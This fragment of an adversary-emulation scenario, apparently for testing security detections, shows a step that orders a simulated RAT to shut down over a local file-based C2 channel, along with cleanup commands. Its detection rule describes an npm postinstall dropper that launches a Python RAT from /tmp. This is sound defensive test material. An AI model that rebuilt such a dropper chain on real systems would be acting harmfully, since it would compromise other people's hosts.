      alive() { kill -0 "$1" 2>/dev/null && ! grep -q '^State:[[:space:]]*Z' "/proc/$1/status" 2>/dev/null; }
      printf '{"type":"kill"}\n' > "$R/c2/tasking.d/.004"
      mv "$R/c2/tasking.d/.004" "$R/c2/tasking.d/004.json"
      n=0
      while [ ! -f "$R/c2/results.d/004.rc" ]; do
        n=$((n + 1))
        if [ "$n" -gt 15 ]; then
          echo "[CortexSim] the RAT did not acknowledge kill within 15 s" >&2
          exit 1
        fi
        sleep 1
      done
      cat "$R/c2/results.d/004.json"; echo
      pid="$(cat "$R/run/ld.pid")"
      n=0
      while alive "$pid"; do
        n=$((n + 1))
        if [ "$n" -gt 10 ]; then
          echo "[CortexSim] the RAT is still running 10 s after rsp_kill" >&2
          exit 1
        fi
        sleep 1
      done
      rm -f "$R/run/ld.pid"
      cat "$R/run/ld.log"
      echo "[CortexSim] SIM-KOI-012 step-07: the RAT acknowledged kill and exited; nothing is left running"
    identity: root
    mitre_technique: "T1219"
    platforms: ["linux"]
    causality:
      parent_step: step-06
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: Correlation
        description: "Correlation CR-KOI-0012 (operator-installed; alert name 'KOI-012 Axios Postinstall Dropper To Python RAT Payload Execution'; Medium; scheduled every 10 min, query time frame 1 h; agent_hostname mapped to Host Name and agent_id to Agent ID; MITRE tag T1219): on one agent, the RAT runs a hidden dot-file from /tmp AND at least two of: a plain-crypto-js file event under node_modules, a file event on /tmp/ld.py, an interpreter started on /tmp/ld.py with an http URL"
        ttp_ref: "TTP-2026-0203"
        detection_id: CR-KOI-0012

cleanup:
  commands:
    - "if [ -d /var/tmp/.cortexsim-axios ] && [ ! -L /var/tmp/.cortexsim-axios ] && [ -O /var/tmp/.cortexsim-axios ] && [ -f /var/tmp/.cortexsim-axios/run/ld.pid ] && grep -q cortexsim-axios \"/proc/$(cat /var/tmp/.cortexsim-axios/run/ld.pid)/cmdline\" 2>/dev/null; then kill \"$(cat /var/tmp/.cortexsim-axios/run/ld.pid)\" 2>/dev/null; fi"
    - "rm -rf /var/tmp/.cortexsim-axios"
    - "echo 'cortexsim-koi-012-cleanup-complete'"

